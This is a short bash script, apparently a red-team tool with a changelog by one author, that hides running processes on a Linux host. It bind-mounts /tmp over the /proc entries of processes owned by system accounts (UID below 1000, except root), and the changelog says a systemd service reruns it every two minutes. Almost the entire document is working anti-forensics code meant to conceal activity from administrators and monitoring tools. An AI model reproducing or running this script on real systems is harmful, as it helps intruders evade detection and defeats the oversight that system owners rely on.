#!/bin/bash
#ChangeLog
#Version 0.10   Andrew - Built a working hide process script.
#Version 0.11   Andrew - Added in a quick variable change section, made Red Team User Friendly
#Version 0.12   Andrew - Removed variable change section, not having to do anything is more user friendly
#Version 0.20   Andrew - Iterates the hide process 5 times, then the 6th time is done by cron
#Version 0.21   Andrew - Any user with an ID < 1000 has all processes hidden
#Version 0.30   Andrew - Removed the two directory check lines as this is now done in setup
#Version 0.31   Andrew - Removed crontab setup as this is now run through systemd as a service
#Version 0.32   Andrew - Removed the 5 time loop and 10 second wait, service is run every 2 minutes
#Version 0.40   Andrew - Placed code into functions

######################################################################
#Builds an array of all users with an ID below 1000
run(){
        for USER in `awk -F: '($3 < 1000) {print $1 }' /etc/passwd | cut -c-7` ; do
                USERS+=($USER)
        done
        hide
}
#Here is where the magic happens :)
hide(){
        for ALL in "${USERS[@]}"; do #For each user in the above array, loop each process over empty dir
                if [ $ALL == "root" ]; then
                        echo "skipping root user"; continue
                fi
                ps aux | grep $ALL | awk -F' ' '{print $2}' | xargs -I{} mount -o bind /tmp /proc/{} 2>/dev/null
        done
}
run

